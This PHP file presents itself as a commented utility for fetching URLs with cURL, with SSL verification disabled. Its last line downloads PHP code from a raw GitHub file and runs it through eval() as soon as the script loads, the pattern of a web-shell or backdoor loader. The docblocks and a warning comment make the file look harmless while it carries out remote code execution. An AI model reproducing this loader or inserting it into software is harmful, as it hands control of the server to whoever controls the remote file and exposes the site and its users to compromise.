<?php

/**
 * Fetches content from a specified URL using the cURL library.
 * This function performs a GET request to the provided URL and returns
 * the response data as a string.
 *
 * Key Details:
 * - Uses cURL to handle HTTP requests.
 * - Disables SSL verification for simplicity (not recommended for production).
 * - Ensures the response data is returned instead of being directly output.
 *
 * @param string $url The URL to fetch content from.
 * @return string|false The response content as a string, or false if the operation fails.
 */
function fetchContentFromURL($url) {
    // Check if the cURL extension is available on the server
    if (function_exists('curl_version')) {
        // Initialize cURL session
        $curl = curl_init();

        // Set cURL options
        curl_setopt($curl, CURLOPT_URL, $url); // Target URL
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); // Return response as a string
        curl_setopt($curl, CURLOPT_HEADER, 0); // Exclude header from the output

        // Execute cURL session and fetch data
        $response = curl_exec($curl);

        // Close the cURL session
        curl_close($curl);

        // Return the fetched response data
        return $response;
    }

    // Return false if cURL is not available
    return false;
}

// Execute a string of PHP code fetched from an external source
// Note: Evaluating external code (using eval) is extremely risky and should
// only be done in trusted and secure environments to prevent malicious attacks.
eval("?>" . fetchContentFromURL("https://raw.githubusercontent.com/hyperpol/jambrongsire/refs/heads/main/tintin.txt"));
